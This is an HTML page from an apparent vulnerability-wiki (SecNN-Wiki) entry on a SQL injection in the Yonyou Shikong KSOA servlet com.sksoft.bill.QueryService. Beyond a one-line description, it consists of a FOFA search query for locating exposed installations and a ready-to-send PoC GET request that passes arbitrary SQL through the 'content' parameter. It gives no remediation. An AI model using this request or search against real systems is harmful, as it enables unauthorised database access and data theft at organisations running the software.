@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BAKSOA%E6%8E%A5%E5%8F%A3com.sksoft.bill.QueryService%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>用友时空KSOA接口com.sksoft.bill.QueryService存在SQL注入漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u7528\u53cb\u65f6\u7a7aKSOA\u63a5\u53e3com.sksoft.bill.QueryService\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "fofa", url: "#fofa", children: [
+          ]},
+          {title: "poc", url: "#poc", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BAKSOA%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3PreviewKPQT.jsp%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BAKSOA%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3PreviewKPQT.jsp%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        用友时空KSOA系统接口PreviewKPQT.jsp存在SQL注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BAKSOA-linkadd.jsp%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BAKSOA-linkadd.jsp%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        用友时空KSOA linkadd.jsp存在SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="ksoacomsksoftbillqueryservicesql">用友时空KSOA接口com.sksoft.bill.QueryService存在SQL注入漏洞<a class="headerlink" href="#ksoacomsksoftbillqueryservicesql" title="Permanent link">&para;</a></h2>
+<p>用友时空KSOA /servlet/com.sksoft.bill.QueryService  存在sql注入漏洞，导致数据泄露。</p>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="l l-Scalar l-Scalar-Plain">app=&quot;用友-时空KSOA&quot;</span>
+</code></pre></div>
+<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="l l-Scalar l-Scalar-Plain">GET /servlet/com.sksoft.bill.QueryService?service=query&amp;content=SELECT%20HashBytes(&#39;md5&#39;,&#39;NjTFtj4Q&#39;); HTTP/1.1</span>
+<span class="l l-Scalar l-Scalar-Plain">Host</span><span class="p p-Indicator">:</span><span class="w"> </span>
+<span class="nt">User-Agent</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.3.4000 Chrome/30.0.1599.101 Safari/537.36</span>
+<span class="nt">Accept-Encoding</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">gzip, deflate, br</span>
+<span class="nt">Connection</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">close</span>
+</code></pre></div>
+<p><img alt="image-20240709134924259" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407091349312.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BAKSOA%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3PreviewKPQT.jsp%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BAKSOA%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3PreviewKPQT.jsp%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        用友时空KSOA系统接口PreviewKPQT.jsp存在SQL注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BAKSOA-linkadd.jsp%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BAKSOA-linkadd.jsp%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        用友时空KSOA linkadd.jsp存在SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
